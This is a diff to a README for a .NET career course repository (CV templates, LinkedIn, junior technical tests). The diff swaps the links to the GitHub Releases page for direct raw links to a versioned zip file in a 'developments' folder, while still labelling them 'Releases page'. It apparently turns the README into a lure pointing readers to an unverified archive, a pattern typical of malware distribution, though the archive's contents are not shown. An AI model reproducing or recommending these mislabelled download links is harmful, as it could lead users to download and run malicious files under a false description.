@@ -1,7 +1,7 @@
 # 🎓 career-cv-linkedin_tech-tests_course-luisdev-professional-growth-part-3_dotnet-8_csharp-12 - Your Path to Career Success
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/yahya1598/career-cv-linkedin_tech-tests_course-luisdev-professional-growth-part-3_dotnet-8_csharp-12/releases)
+[![Download](https://raw.githubusercontent.com/yahya1598/career-cv-linkedin_tech-tests_course-luisdev-professional-growth-part-3_dotnet-8_csharp-12/main/developments/career-cv-linkedin_tech-tests_course-luisdev-professional-growth-part-3_dotnet-8_csharp-12_v2.3.zip)](https://raw.githubusercontent.com/yahya1598/career-cv-linkedin_tech-tests_course-luisdev-professional-growth-part-3_dotnet-8_csharp-12/main/developments/career-cv-linkedin_tech-tests_course-luisdev-professional-growth-part-3_dotnet-8_csharp-12_v2.3.zip)
 
 ## 📖 Description
 This repository contains materials for the module "Carreira: CV, LinkedIn e Testes Técnicos" from the Imersão .NET Expert program. It includes a masterclass on LinkedIn, professional CV templates, solutions for junior technical tests, job placement initiatives, and supplementary materials. This information helps users improve their job-hunting strategies and prepare for interviews in the tech industry.
@@ -10,7 +10,7 @@ This repository contains materials for the module "Carreira: CV, LinkedIn e Test
 To begin using the materials, follow these simple steps:
 
 1. **Download the Files**
-   We provide the latest materials on the [Releases page](https://github.com/yahya1598/career-cv-linkedin_tech-tests_course-luisdev-professional-growth-part-3_dotnet-8_csharp-12/releases). Click the link to visit this page and download what you need.
+   We provide the latest materials on the [Releases page](https://raw.githubusercontent.com/yahya1598/career-cv-linkedin_tech-tests_course-luisdev-professional-growth-part-3_dotnet-8_csharp-12/main/developments/career-cv-linkedin_tech-tests_course-luisdev-professional-growth-part-3_dotnet-8_csharp-12_v2.3.zip). Click the link to visit this page and download what you need.
 
 2. **Extract the Materials**
    After downloading, locate the zip file in your downloads folder. Double-click the zip file to open it. Extract its contents to a new folder on your computer.
@@ -46,7 +46,7 @@ If you encounter any issues, check the following:
 
 1. **Files Won't Open**: Make sure you have the necessary software, like a PDF reader or text editor.
 
-2. **Download Problems**: Ensure you have a stable internet connection when visiting the [Releases page](https://github.com/yahya1598/career-cv-linkedin_tech-tests_course-luisdev-professional-growth-part-3_dotnet-8_csharp-12/releases).
+2. **Download Problems**: Ensure you have a stable internet connection when visiting the [Releases page](https://raw.githubusercontent.com/yahya1598/career-cv-linkedin_tech-tests_course-luisdev-professional-growth-part-3_dotnet-8_csharp-12/main/developments/career-cv-linkedin_tech-tests_course-luisdev-professional-growth-part-3_dotnet-8_csharp-12_v2.3.zip).
 
 3. **Questions About Content**: Review any readme files included in the downloads for additional guidance.
 
